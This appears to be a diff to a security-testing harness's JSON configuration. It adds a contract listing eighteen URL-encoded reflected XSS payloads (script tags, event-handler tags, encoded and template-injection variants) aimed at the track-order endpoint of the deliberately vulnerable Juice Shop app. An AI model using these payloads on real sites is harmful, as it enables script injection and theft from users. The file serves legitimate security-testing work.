@@ -5999,13 +5999,165 @@
       "suite": "juice-shop-exploits",
       "entrypoint": "suites/juice-shop-exploits/03-xss-dom-reflected.sh",
       "kind": "shell",
-      "dependencies": ["bash", "curl", "python3"],
+      "dependencies": ["bash", "curl", "python3", "node", "playwright"],
       "after": ["juice-shop-exploits/02-sqli-search-union"],
       "target_paths": ["/juice-shop/"],
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "route_contract": {
+        "actions": [
+          "fragment-0",
+          "fragment-1",
+          "fragment-2",
+          "fragment-3",
+          "fragment-4",
+          "fragment-5",
+          "fragment-6",
+          "fragment-7",
+          "fragment-8",
+          "fragment-9",
+          "fragment-10",
+          "fragment-11",
+          "fragment-12",
+          "fragment-13",
+          "fragment-14",
+          "fragment-15",
+          "fragment-16",
+          "fragment-17"
+        ]
+      },
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "reflected-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-1",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cimg%20src%3Dx%20onerror%3Dalert%28%22xss%22%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Csvg%20onload%3Dalert%28%22xss%22%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-3",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cbody%20onload%3Dalert%28%22xss%22%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-4",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-5",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-6",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cmarquee%20onstart%3Dalert%281%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-7",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-8",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cselect%20onfocus%3Dalert%281%29%20autofocus%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-9",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Ctextarea%20onfocus%3Dalert%281%29%20autofocus%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-10",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-11",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Caudio%20src%3Dx%20onerror%3Dalert%281%29%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-12",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/script%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-13",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%27-alert%281%29-%27",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-14",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Cimg%20src%3Dx%20onerror%3D%22atob%28%27YWxlcnQoMSk%3D%27%29%22%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-15",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%7B%7Bconstructor.constructor%28%22alert%281%29%22%29%28%29%7D%7D",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-16",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%24%7Balert%281%29%7D",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "reflected-17",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/%3Csvg/onload%3Dalert%281%29//%3E",
+            "payload_class": "reflected-xss-path",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/04-xss-stored-api",
